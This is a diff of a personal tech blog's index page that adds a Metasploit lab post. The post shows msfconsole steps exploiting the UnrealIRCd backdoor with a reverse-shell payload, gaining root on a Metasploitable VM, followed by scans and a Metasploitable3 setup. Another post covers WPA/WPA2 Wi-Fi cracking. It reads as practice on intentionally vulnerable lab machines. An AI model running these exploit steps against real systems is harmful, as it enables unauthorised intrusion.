@@ -139,8 +139,8 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2019/02/27/ubuntu-ext-display/">
-                ubuntu18.04双显示器
+            <a href="/2019/02/27/metasploit/">
+                Metasploit
             </a>
         </h1>
         <div class="post-info">
@@ -154,7 +154,58 @@
 
     
         <div class="content">
-            <h1 id="ubuntu18-04双显示器配置"><a href="#ubuntu18-04双显示器配置" class="headerlink" title="ubuntu18.04双显示器配置"></a>ubuntu18.04双显示器配置</h1><p>环境Thinkpad x201, ubuntu18.04, 外接显示器1920x1080, VGA接口</p>
+            <h2 id="测试用的被攻击Linux虚拟机镜像下载"><a href="#测试用的被攻击Linux虚拟机镜像下载" class="headerlink" title="测试用的被攻击Linux虚拟机镜像下载"></a>测试用的被攻击Linux虚拟机镜像下载</h2><blockquote>
+<p><a href="https://sourceforge.net/projects/metasploitable/" target="_blank" rel="noopener">Metasploitable</a></p>
+</blockquote>
+<h2 id="start-msconsole"><a href="#start-msconsole" class="headerlink" title="start msconsole"></a>start msconsole</h2><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service postgresql start</span><br><span class="line">msconsole</span><br></pre></td></tr></table></figure>
+<h2 id="IRC-on-Metasploitable"><a href="#IRC-on-Metasploitable" class="headerlink" title="IRC on Metasploitable"></a>IRC on Metasploitable</h2><p>Kali Linux: 192.168.56.100<br>Metasploitable: 192.168.56.101</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">search Unreal 3.2.1.8</span><br><span class="line">use exploit/unix/irc/unreal_ircd_3281_backdoor</span><br><span class="line">show options</span><br><span class="line">set RHOSTS 192.168.56.101</span><br><span class="line">show payloads</span><br><span class="line">set payload cmd/unix/reverse</span><br><span class="line">show options</span><br><span class="line">set LHOST 192.168.56.100</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>Can connect to 192.168.56.101 with root account</p>
+<h2 id="Modules"><a href="#Modules" class="headerlink" title="Modules"></a>Modules</h2><blockquote>
+<p><a href="https://www.bilibili.com/video/av16925201" target="_blank" rel="noopener">Metasploit系列教程第一季</a></p>
+</blockquote>
+<h3 id="Port-scan"><a href="#Port-scan" class="headerlink" title="Port scan"></a>Port scan</h3><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> nmap -v -sV 192.168.56.101</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search portscan</span><br><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">set RHOSTS 192.168.56.101</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h3 id="SMB-scan-for-windows-system-information"><a href="#SMB-scan-for-windows-system-information" class="headerlink" title="SMB scan for windows system information"></a>SMB scan for windows system information</h3><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search smb_version</span><br><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line">set RHOSTS 192.168.56.101</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h3 id="服务识别"><a href="#服务识别" class="headerlink" title="服务识别"></a>服务识别</h3><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search ssh_version</span><br><span class="line">use auxiliary/scanner/ssh/ssh_version</span><br><span class="line">set RHOSTS 192.168.56.101</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search ftp_version</span><br><span class="line">use auxiliary/scanner/ftp/ftp_version</span><br></pre></td></tr></table></figure>
+<h3 id="Sniffer"><a href="#Sniffer" class="headerlink" title="Sniffer"></a>Sniffer</h3><p>auxiliary/sniffer/psnuffle</p>
+<p>TODO</p>
+<h2 id="测试用的被攻击Windows-2008"><a href="#测试用的被攻击Windows-2008" class="headerlink" title="测试用的被攻击Windows 2008"></a>测试用的被攻击Windows 2008</h2><blockquote>
+<p><a href="https://github.com/rapid7/metasploitable3" target="_blank" rel="noopener">Metasploitable3</a></p>
+</blockquote>
+<p>Vagrantfile</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- mode: ruby -*-</span></span><br><span class="line"><span class="comment"># vi: set ft=ruby :</span></span><br><span class="line"></span><br><span class="line">Vagrant.configure(<span class="string">"2"</span>) <span class="keyword">do</span> <span class="params">|config|</span></span><br><span class="line">  config.vm.synced_folder <span class="string">'.'</span>, <span class="string">'/vagrant'</span>, <span class="symbol">disabled:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  config.vm.define <span class="string">"win2k8"</span> <span class="keyword">do</span> <span class="params">|win2k8|</span></span><br><span class="line">    <span class="comment"># Base configuration for the VM and provisioner</span></span><br><span class="line">    win2k8.vm.box = <span class="string">"rapid7/metasploitable3-win2k8"</span></span><br><span class="line">    win2k8.vm.hostname = <span class="string">"metasploitable3-win2k8"</span></span><br><span class="line">    win2k8.vm.communicator = <span class="string">"winrm"</span></span><br><span class="line">    win2k8.winrm.retry_limit = <span class="number">60</span></span><br><span class="line">    win2k8.winrm.retry_delay = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">    win2k8.vm.network <span class="string">"private_network"</span>, <span class="symbol">name:</span> <span class="string">"vboxnet0"</span>, <span class="symbol">ip:</span> <span class="string">"192.168.56.108"</span></span><br><span class="line">    win2k8.vm.provider <span class="string">"virtualbox"</span> <span class="keyword">do</span> <span class="params">|v|</span></span><br><span class="line">      v.name = <span class="string">"Metasploitable3-win2k8"</span></span><br><span class="line">      v.memory = <span class="number">768</span></span><br><span class="line">      v.cpus = <span class="number">1</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Configure Firewall to open up vulnerable services</span></span><br><span class="line">    <span class="keyword">case</span> ENV[<span class="string">'MS3_DIFFICULTY'</span>]</span><br><span class="line">      <span class="keyword">when</span> <span class="string">'easy'</span></span><br><span class="line">        win2k8.vm.provision <span class="symbol">:shell</span>, <span class="symbol">inline:</span> <span class="string">"C:\\startup\\disable_firewall.bat"</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        win2k8.vm.provision <span class="symbol">:shell</span>, <span class="symbol">inline:</span> <span class="string">"C:\\startup\\enable_firewall.bat"</span></span><br><span class="line">        win2k8.vm.provision <span class="symbol">:shell</span>, <span class="symbol">inline:</span> <span class="string">"C:\\startup\\configure_firewall.bat"</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Insecure share from the Linux machine</span></span><br><span class="line">    win2k8.vm.provision <span class="symbol">:shell</span>, <span class="symbol">inline:</span> <span class="string">"C:\\startup\\install_share_autorun.bat"</span></span><br><span class="line">    win2k8.vm.provision <span class="symbol">:shell</span>, <span class="symbol">inline:</span> <span class="string">"C:\\startup\\setup_linux_share.bat"</span></span><br><span class="line">    win2k8.vm.provision <span class="symbol">:shell</span>, <span class="symbol">inline:</span> <span class="string">"rm C:\\startup\\*"</span> <span class="comment"># Cleanup startup scripts</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">=begin</span></span><br><span class="line"><span class="comment">  config.vm.define "ub1404" do |ub1404|</span></span><br><span class="line"><span class="comment">    ub1404.vm.box = "rapid7/metasploitable3-ub1404"</span></span><br><span class="line"><span class="comment">    ub1404.vm.hostname = "metasploitable3-ub1404"</span></span><br><span class="line"><span class="comment">    config.ssh.username = 'vagrant'</span></span><br><span class="line"><span class="comment">    config.ssh.password = 'vagrant'</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    ub1404.vm.network "private_network", ip: '172.28.128.3'</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    ub1404.vm.provider "virtualbox" do |v|</span></span><br><span class="line"><span class="comment">      v.name = "Metasploitable3-ub1404"</span></span><br><span class="line"><span class="comment">      v.memory = 2048</span></span><br><span class="line"><span class="comment">    end</span></span><br><span class="line"><span class="comment">  end</span></span><br><span class="line"><span class="comment">=end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> vagrant -h</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> vagrant up</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> vagrant halt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> vagrant <span class="built_in">suspend</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> vagrant resume</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> vagrant ssh</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> vagrant up win2k8</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> vagrant halt win2k8</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> vagrant <span class="built_in">suspend</span> win2k8</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> vagrant resume win2k8</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## windows commands after vagrant ssh</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> check free memory</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> wmic OS get FreePhysicalMemory,FreeVirtualMemory,FreeSpaceInPagingFiles /VALUE</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> check system information like memory</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> systeminfo</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> use following <span class="built_in">command</span> to add route</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> route -p add 192.168.56.0 mask 255.255.255.0 192.168.56.1</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> or following <span class="built_in">command</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> netsh int ip <span class="built_in">set</span> address <span class="string">"Local Area Connection 2"</span> address=192.168.56.108 mask=255.255.255.0 gateway=192.168.56.1</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> vagrant up</span></span><br><span class="line">Bringing machine 'win2k8' up with 'virtualbox' provider...</span><br><span class="line">==&gt; win2k8: Checking if box 'rapid7/metasploitable3-win2k8' version '0.1.0-weekly' is up to date...</span><br><span class="line">==&gt; win2k8: Clearing any previously set forwarded ports...</span><br><span class="line">==&gt; win2k8: Clearing any previously set network interfaces...</span><br><span class="line">==&gt; win2k8: Preparing network interfaces based on configuration...</span><br><span class="line">    win2k8: Adapter 1: nat</span><br><span class="line">    win2k8: Adapter 2: hostonly</span><br><span class="line">==&gt; win2k8: Forwarding ports...</span><br><span class="line">    win2k8: 3389 (guest) =&gt; 3389 (host) (adapter 1)</span><br><span class="line">    win2k8: 22 (guest) =&gt; 2222 (host) (adapter 1)</span><br><span class="line">    win2k8: 5985 (guest) =&gt; 55985 (host) (adapter 1)</span><br><span class="line">    win2k8: 5986 (guest) =&gt; 55986 (host) (adapter 1)</span><br><span class="line">==&gt; win2k8: Running 'pre-boot' VM customizations...</span><br><span class="line">==&gt; win2k8: Booting VM...</span><br><span class="line">==&gt; win2k8: Waiting for machine to boot. This may take a few minutes...</span><br><span class="line">    win2k8: WinRM address: 127.0.0.1:55985</span><br><span class="line">    win2k8: WinRM username: vagrant</span><br><span class="line">    win2k8: WinRM execution_time_limit: PT2H</span><br><span class="line">    win2k8: WinRM transport: negotiate</span><br><span class="line">==&gt; win2k8: Machine booted and ready!</span><br><span class="line">==&gt; win2k8: Checking for guest additions in VM...</span><br><span class="line">    win2k8: The guest additions on this VM do not match the installed version of</span><br><span class="line">    win2k8: VirtualBox! In most cases this is fine, but in rare cases it can</span><br><span class="line">    win2k8: prevent things such as shared folders from working properly. If you see</span><br><span class="line">    win2k8: shared folder errors, please make sure the guest additions within the</span><br><span class="line">    win2k8: virtual machine match the version of VirtualBox you have installed on</span><br><span class="line">    win2k8: your host and reload your VM.</span><br><span class="line">    win2k8: </span><br><span class="line">    win2k8: Guest Additions Version: 5.2.8</span><br><span class="line">    win2k8: VirtualBox Version: 6.0</span><br><span class="line">==&gt; win2k8: Setting hostname...</span><br><span class="line">==&gt; win2k8: Configuring and enabling network interfaces...</span><br><span class="line">==&gt; win2k8: Machine already provisioned. Run `vagrant provision` or use the `--provision`</span><br><span class="line">==&gt; win2k8: flag to force provisioning. Provisioners marked to run always will still run.</span><br><span class="line"><span class="meta">$</span><span class="bash"></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap 192.168.56.108</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 7.60 ( https://nmap.org ) at 2019-02-28 15:20 CST</span><br><span class="line">Nmap scan report for 192.168.56.108</span><br><span class="line">Host is up (0.00077s latency).</span><br><span class="line">Not shown: 991 filtered ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">21/tcp    open  ftp</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">4848/tcp  open  appserv-http</span><br><span class="line">8080/tcp  open  http-proxy</span><br><span class="line">8383/tcp  open  m2mservices</span><br><span class="line">9200/tcp  open  wap-wsp</span><br><span class="line">49153/tcp open  unknown</span><br><span class="line">49154/tcp open  unknown</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 4.51 seconds</span><br></pre></td></tr></table></figure>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2019/02/27/ubuntu-ext-display/">
+                ubuntu18.04双显示器配置
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-02-27</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>环境Thinkpad x201, ubuntu18.04, 外接显示器1920x1080, VGA接口</p>
 <blockquote>
 <p><a href="https://askubuntu.com/questions/138408/how-to-add-display-resolution-for-an-lcd-in-ubuntu-12-04-xrandr-problem" target="_blank" rel="noopener">how-to-add-display-resolution-for-an-lcd-in-ubuntu-12-04-xrandr-problem</a></p>
 </blockquote>
@@ -194,7 +245,7 @@
 
     
         <div class="content">
-            <h1 id="Kali-Linux破解WPA-WPA2-Wifi密码"><a href="#Kali-Linux破解WPA-WPA2-Wifi密码" class="headerlink" title="Kali Linux破解WPA/WPA2 Wifi密码"></a>Kali Linux破解WPA/WPA2 Wifi密码</h1><blockquote>
+            <h2 id="Kali-Linux破解WPA-WPA2-Wifi密码"><a href="#Kali-Linux破解WPA-WPA2-Wifi密码" class="headerlink" title="Kali Linux破解WPA/WPA2 Wifi密码"></a>Kali Linux破解WPA/WPA2 Wifi密码</h2><blockquote>
 <p><a href="http://topspeedsnail.com/kali-linux-crack-wifi-wpa/" target="_blank" rel="noopener">Kali Linux使用Aircrack破解wifi密码(wpa/wpa2)</a><br><a href="http://lewiscomputerhowto.blogspot.com/2014/06/how-to-hack-wpawpa2-wi-fi-with-kali.html" target="_blank" rel="noopener">How To Hack WPA/WPA2 Wi-Fi With Kali Linux &amp; Aircrack-ng</a><br><a href="https://www.sunnyhoi.com/how-to-crack-wpawpa2-wi-fi-passwords-using-aircrack-ng-in-kali/" target="_blank" rel="noopener">How To Crack WPA/WPA2 Wi-Fi Passwords Using Aircrack-Ng In Kali</a></p>
 </blockquote>
 <p>Notes:</p>
@@ -208,11 +259,12 @@
 <li><p>如果对方密码不在字典里，也足够复杂，那就不用指望能破解出来了，所以这个要看运气</p>
 </li>
 </ul>
-<h1 id="Kali-Metasploit"><a href="#Kali-Metasploit" class="headerlink" title="Kali Metasploit"></a>Kali Metasploit</h1><p><a href="/2019/02/27/metasploit/">Metasploit</a></p>
-<h1 id="apt-package"><a href="#apt-package" class="headerlink" title="apt package"></a>apt package</h1><ul>
+<h2 id="Kali-Metasploit"><a href="#Kali-Metasploit" class="headerlink" title="Kali Metasploit"></a>Kali Metasploit</h2><p><a href="/2019/02/27/metasploit/">Metasploit</a></p>
+<h2 id="apt-package"><a href="#apt-package" class="headerlink" title="apt package"></a>apt package</h2><ul>
 <li>netstat</li>
 </ul>
 <figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install net-tools</span><br></pre></td></tr></table></figure>
+
         </div>
     
 
@@ -238,7 +290,7 @@
 
     
         <div class="content">
-            <h1 id="Kali-Linux-Notes"><a href="#Kali-Linux-Notes" class="headerlink" title="Kali Linux Notes"></a>Kali Linux Notes</h1><p>Install Kali Linux on VirtualBox. The host is ubuntu</p>
+            <p>Install Kali Linux on VirtualBox. The host is ubuntu</p>
 <p>Set 1G memory and 2 CPUs.</p>
 <h2 id="MT7601U-Wireless-Adapter-in-Kali-in-VirtualBox"><a href="#MT7601U-Wireless-Adapter-in-Kali-in-VirtualBox" class="headerlink" title="MT7601U Wireless Adapter in Kali in VirtualBox"></a>MT7601U Wireless Adapter in Kali in VirtualBox</h2><p>MT7601U Wireless Adapter can be used in my host system. No need to do any setting. The ubuntu has driver already.</p>
 <p>But in guest VirtualBox Kali linux, it can’t work by default.</p>
@@ -433,7 +485,7 @@
 
     
         <div class="content">
-            <h1 id="Springboot"><a href="#Springboot" class="headerlink" title="Springboot"></a>Springboot</h1><p><a href="https://projects.spring.io/spring-boot/" target="_blank" rel="noopener">Official site</a></p>
+            <p><a href="https://projects.spring.io/spring-boot/" target="_blank" rel="noopener">Official site</a></p>
 <h2 id="Start-a-new-Spring-boot-project"><a href="#Start-a-new-Spring-boot-project" class="headerlink" title="Start a new Spring boot project"></a>Start a new Spring boot project</h2><p><a href="https://start.spring.io/" target="_blank" rel="noopener">Tool to generate base framework</a></p>
 <p><img src="/myimages/springboot_start.png" alt="Spring Boot Start"></p>
 
@@ -462,7 +514,7 @@
 
     
         <div class="content">
-            <h1 id="Gradle"><a href="#Gradle" class="headerlink" title="Gradle"></a>Gradle</h1><p>Gradle是一个基于Apache Ant和Apache Maven概念的项目自动化建构工具。它使用一种基于Groovy的特定领域语言来声明项目设置，而不是传统的XML。 当前其支持的语言限于Java、Groovy和Scala，计划未来将支持更多的语言</p>
+            <p>Gradle是一个基于Apache Ant和Apache Maven概念的项目自动化建构工具。它使用一种基于Groovy的特定领域语言来声明项目设置，而不是传统的XML。 当前其支持的语言限于Java、Groovy和Scala，计划未来将支持更多的语言</p>
 <h2 id="install"><a href="#install" class="headerlink" title="install"></a>install</h2><p><a href="https://gradle.org/install/" target="_blank" rel="noopener">Install</a><br>Gradle Wrapper is recommended. It doesn’t need to install Gradle.</p>
 <h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><blockquote>
 <p><a href="https://gradle.org/" target="_blank" rel="noopener">https://gradle.org/</a><br><a href="http://blog.jobbole.com/99638/" target="_blank" rel="noopener">http://blog.jobbole.com/99638/</a></p>
@@ -479,7 +531,7 @@
     <div class="post-header index">
         <h1 class="title">
             <a href="/2018/03/01/ubuntu1604/">
-                ubuntu 16.04 notes
+                Tips for Ubuntu 16.04
             </a>
         </h1>
         <div class="post-info">
@@ -493,7 +545,7 @@
 
     
         <div class="content">
-            <h1 id="Tips-for-Ubuntu-16-04"><a href="#Tips-for-Ubuntu-16-04" class="headerlink" title="Tips for Ubuntu 16.04"></a>Tips for Ubuntu 16.04</h1><h2 id="Browser-to-support-Java"><a href="#Browser-to-support-Java" class="headerlink" title="Browser to support Java"></a>Browser to support Java</h2><p>Install Firefox 51. The new Firefox and Chrome don’t support Java anymore.<br>Install IcedTea Java Web Start to support Java plugin.</p>
+            <h2 id="Browser-to-support-Java"><a href="#Browser-to-support-Java" class="headerlink" title="Browser to support Java"></a>Browser to support Java</h2><p>Install Firefox 51. The new Firefox and Chrome don’t support Java anymore.<br>Install IcedTea Java Web Start to support Java plugin.</p>
 <h2 id="Full-screen-a-window"><a href="#Full-screen-a-window" class="headerlink" title="Full screen a window"></a>Full screen a window</h2><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmctrl -r "Cloud Desktop GCG - Citrix Receiver for Java" -b toggle,fullscreen</span><br></pre></td></tr></table></figure>
 <h2 id="Switch-between-multi-desktop"><a href="#Switch-between-multi-desktop" class="headerlink" title="Switch between multi-desktop"></a>Switch between multi-desktop</h2><p>CTRL+ALT+ UP/DOWN/LEFT/RIGHT<br>SUPER + S</p>
 <h2 id="check-CPU-Temp"><a href="#check-CPU-Temp" class="headerlink" title="check CPU Temp"></a>check CPU Temp</h2><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install lm-sensors</span><br><span class="line">...</span><br><span class="line">quxr@quxr-ThinkPad-X201:~$ sensors</span><br><span class="line">coretemp-isa-0000</span><br><span class="line">Adapter: ISA adapter</span><br><span class="line">Core 0:       +60.0°C  (high = +95.0°C, crit = +105.0°C)</span><br><span class="line">Core 2:       +58.0°C  (high = +95.0°C, crit = +105.0°C)</span><br><span class="line"></span><br><span class="line">acpitz-virtual-0</span><br><span class="line">Adapter: Virtual device</span><br><span class="line">temp1:        +65.0°C  (crit = +100.0°C)</span><br><span class="line"></span><br><span class="line">thinkpad-isa-0000</span><br><span class="line">Adapter: ISA adapter</span><br><span class="line">fan1:        3464 RPM</span><br><span class="line">temp1:        +65.0°C  </span><br><span class="line">temp2:         +0.0°C  </span><br><span class="line">temp3:         +0.0°C  </span><br><span class="line">temp4:         +0.0°C  </span><br><span class="line">temp5:         +0.0°C  </span><br><span class="line">temp6:         +0.0°C  </span><br><span class="line">temp7:         +0.0°C  </span><br><span class="line">temp8:         +0.0°C</span><br></pre></td></tr></table></figure>
@@ -523,7 +575,9 @@
 
     
         <div class="content">
-            <h1 id="Hexo-notes"><a href="#Hexo-notes" class="headerlink" title="Hexo notes"></a>Hexo notes</h1><h2 id="some-commands"><a href="#some-commands" class="headerlink" title="some commands"></a>some commands</h2><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo new "pagename"</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
+            <h2 id="some-commands"><a href="#some-commands" class="headerlink" title="some commands"></a>some commands</h2><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo new "pagename"</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
+<p>g - generate<br>s - server<br>d - deploy</p>
+
         </div>
     
 
@@ -549,7 +603,7 @@
 
     
         <div class="content">
-            <h1 id="git-notes"><a href="#git-notes" class="headerlink" title="git notes"></a>git notes</h1><h2 id="Adding-an-existing-project-to-GitHub-using-the-command-line"><a href="#Adding-an-existing-project-to-GitHub-using-the-command-line" class="headerlink" title="Adding an existing project to GitHub using the command line"></a>Adding an existing project to GitHub using the command line</h2><blockquote>
+            <h2 id="Adding-an-existing-project-to-GitHub-using-the-command-line"><a href="#Adding-an-existing-project-to-GitHub-using-the-command-line" class="headerlink" title="Adding an existing project to GitHub using the command line"></a>Adding an existing project to GitHub using the command line</h2><blockquote>
 <p><a href="https://help.github.com/en/articles/adding-an-existing-project-to-github-using-the-command-line" target="_blank" rel="noopener">Adding an existing project to GitHub using the command line</a></p>
 </blockquote>
 <p>Note: <strong>推荐使用SSH URL，可以不用每次提交都输入密码,需要客户端生成pub/pri key pair,然后通过Web控制台添加pub key到github/setting/SSH and GPG keys中</strong></p>
@@ -573,33 +627,6 @@
 <figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">/data/Download/backup/myinv$ git fetch origin</span><br><span class="line">|DNS-request| github.com</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:2080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response| github.com is 13.250.177.223</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:2080-&lt;&gt;&lt;&gt;-13.250.177.223:22-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">remote: Enumerating objects: 5, done.</span><br><span class="line">remote: Counting objects: 100% (5/5), done.</span><br><span class="line">remote: Compressing objects: 100% (1/1), done.</span><br><span class="line">remote: Total 3 (delta 2), reused 3 (delta 2), pack-reused 0</span><br><span class="line">展开对象中: 100% (3/3), 完成.</span><br><span class="line">来自 github.com:aaray6/myinventory</span><br><span class="line">   a69c9af..0447f8f  master     -&gt; origin/master</span><br><span class="line"></span><br><span 